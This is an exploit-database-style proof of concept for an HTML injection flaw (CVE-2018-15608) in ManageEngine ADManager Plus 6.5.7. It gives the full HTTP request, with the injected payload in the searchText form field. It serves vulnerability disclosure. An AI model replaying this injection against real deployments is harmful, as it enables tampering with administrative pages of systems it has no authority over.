@@ -1,0 +1,51 @@
+# Exploit Title: ManageEngine ADManager Plus 6.5.7 - HTML Injection
+# Date: 2018-08-21 
+# Exploit Author: Ismail Tasdelen
+# Vendor Homepage: https://www.manageengine.com/
+# Hardware Link : https://www.manageengine.com/products/ad-manager/
+# Software : ZOHO Corp ManageEngine ADManager Plus
+# Product Version:  6.5.7
+# Vulernability Type : Code Injection
+# Vulenrability : HTML Injection
+# CVE : CVE-2018-15608
+
+# ZOHO Corp ManageEngine ADManager Plus 6.5.7 allows HTML Injection on 
+# the "AD Delegation" "Help Desk Technicians" screen.
+
+# HTTP Request Header :
+
+Request URL: http://172.16.2.105:8080/ADMPTechnicians.do?methodToCall=listTechnicianRows
+Request Method: POST
+Status Code: 200 OK
+Remote Address: 172.16.2.105:8080
+Referrer Policy: no-referrer-when-downgrade
+Accept: */*
+Accept-Encoding: gzip, deflate
+Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: keep-alive
+Content-Length: 301
+Content-type: application/x-www-form-urlencoded;charset=UTF-8
+Cookie: adscsrf=614ff642-779b-41aa-bff5-44370ad770c2; JSESSIONID=79DE1A7AE1DC5B7D88FCBF02AB425987; JSESSIONIDSSO=19AA1682A937F344D1DCB190B31343FB
+Host: 172.16.2.105:8080
+Origin: http://172.16.2.105:8080
+Referer: http://172.16.2.105:8080/Delegation.do?selectedTab=delegation&selectedTile=technicians
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36
+X-Requested-With: XMLHttpRequest
+
+# HTTP Response Header :
+
+Content-Length: 3753
+Content-Type: text/html;charset=UTF-8
+Date: Tue, 14 Aug 2018 10:14:32 GMT
+Server: Apache-Coyote/1.1
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 1
+
+# Query String Parameters :
+
+methodToCall: listTechnicianRows
+
+# Form Data :
+
+params: {"startIndex":1,"range":10,"searchText":"\"><h1>Ismail Tasdelen</h1>","ascending":true,"isNavigation":false,"adminSelected":false,"isNewRange":false,"sortColumn":FULL_NAME,"typeFilters":"","domainFilters":"","viewType":defaultView}
+adscsrf: 614ff642-779b-41aa-bff5-44370ad770c2
